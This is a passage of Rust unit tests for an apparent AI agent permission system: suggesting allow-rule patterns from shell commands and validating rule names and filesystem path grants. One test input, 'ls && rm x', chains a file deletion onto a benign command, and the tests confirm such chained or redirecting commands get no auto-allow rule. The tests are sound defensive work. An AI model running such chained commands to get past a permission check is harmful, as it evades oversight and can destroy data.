        let suggested = |target: Target| suggest(COMMAND_TOOL, &target).map(|rule| rule.pattern);
        assert_eq!(
            suggested(command("cargo test -p x")),
            Some("cargo test".into())
        );
        assert_eq!(suggested(command("ls -la")), Some("ls".into()));
        assert_eq!(suggested(command("npm run build")), Some("npm run".into()));
        assert_eq!(suggested(command("ls && rm x")), None);
        assert_eq!(suggested(command("echo > f")), None);
        let file = suggest("write_file", &path("/p/src/a.rs", Some("src/a.rs"))).unwrap();
        assert_eq!(file.pattern, "/p/src/**");
        assert_eq!(file.action, Allow);
        assert_eq!(suggest("web_fetch", &Target::Other).unwrap().pattern, "");
    }

    #[test]
    fn rules_and_grants_are_validated() {
        assert!(validate_rule(&rule("run_command", "cargo", Allow)).is_ok());
        assert!(validate_rule(&rule(" ", "", Allow)).is_err());
        assert!(validate_rule(&rule("run command", "", Allow)).is_err());
        let grant = |path: &str| PathGrant {
            path: path.into(),
            mode: PathMode::Read,
        };
        assert!(validate_grant(&grant("~/.cargo")).is_ok());
        assert!(validate_grant(&grant("/usr/local/go")).is_ok());
        assert!(validate_grant(&grant(r"C:\Users\me\.cargo")).is_ok());
        assert!(validate_grant(&grant("relative/path")).is_err());
        assert!(validate_grant(&grant("~/.cache/*")).is_err());
    }
}
